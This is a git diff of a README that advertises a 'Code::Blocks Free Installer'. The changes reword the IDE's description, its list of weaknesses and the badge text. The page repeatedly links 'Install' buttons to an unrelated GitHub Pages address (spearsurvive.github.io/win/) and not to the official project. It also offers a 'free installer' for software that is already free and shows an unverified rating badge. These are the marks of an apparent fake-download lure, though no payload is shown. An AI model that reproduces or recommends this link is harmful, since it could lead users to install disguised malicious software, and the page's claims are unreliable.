@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-IDE-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-C/C+++IDE-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Code::Blocks Free Installer** — Code::Blocks is a free, cross-platform C, C++, and Fortran IDE with a plugin system, syntax highlighting, code completion, and multiple compiler support. Works without internet access, no account required. Full offline installation.
+**💻 Code::Blocks Free Installer** — Code::Blocks is a free, open-source C, C++, and Fortran IDE for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install CodeBlocks](https://img.shields.io/badge/⬇_Install_CodeBlocks-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Code::Blocks](https://img.shields.io/badge/⬇_Install_CodeBlocks-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Code::Blocks
 
-Code::Blocks is a free, cross-platform C, C++, and Fortran IDE with a plugin system, syntax highlighting, code completion, and multiple compiler support. Popular in universities and education for learning systems programming.
+Code::Blocks is a free, open-source C, C++, and Fortran IDE for Windows, macOS, and Linux. With a plugin architecture, configurable build system supporting multiple compilers including GCC, MSVC, and Clang, and a visual debugger, Code::Blocks provides a capable IDE experience without the resource requirements of commercial alternatives. Popular in educational settings for C++ courses.
 
 ---
 
 ## ❌ Problem: Code::Blocks is hard to access
 
-- **Dated Interface** — UI design significantly older than modern IDEs
-- **Limited Language Support** — Primarily C/C++; other language support through plugins
-- **Development Pace** — Updates arrive infrequently compared to actively developed IDEs
-- **Competition** — CLion, Qt Creator, and VS Code offer more modern C++ development experiences
+- **Dated Interface** — Visual design and UX reflect the software's age
+- **Development Pace** — Updates less frequent than actively maintained IDEs
+- **Modern Standards** — C++20/23 support relies on compiler setup rather than IDE intelligence
+- **Plugin Quality** — Community plugins vary significantly in quality
 
 ---
 
@@ -81,7 +81,7 @@ Code::Blocks is a free, cross-platform C, C++, and Fortran IDE with a plugin sys
 
 <div align="center">
 
-[![⬇ Install CodeBlocks](https://img.shields.io/badge/⬇_Install_CodeBlocks-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Code::Blocks](https://img.shields.io/badge/⬇_Install_CodeBlocks-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Code::Blocks is a free, cross-platform C, C++, and Fortran IDE with a plugin sys
 
 ---
 
-**Code::Blocks Free Installer** — Code::Blocks is a free, cross-platform C, C++, and Fortran IDE with a plugin system, syntax highlighting, code completion, and multiple compiler support. Install without internet connection today!
+**Code::Blocks Free Installer** — Code::Blocks is a free, open-source C, C++, and Fortran IDE for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install CodeBlocks](https://img.shields.io/badge/⬇_Install_CodeBlocks-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Code::Blocks](https://img.shields.io/badge/⬇_Install_CodeBlocks-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
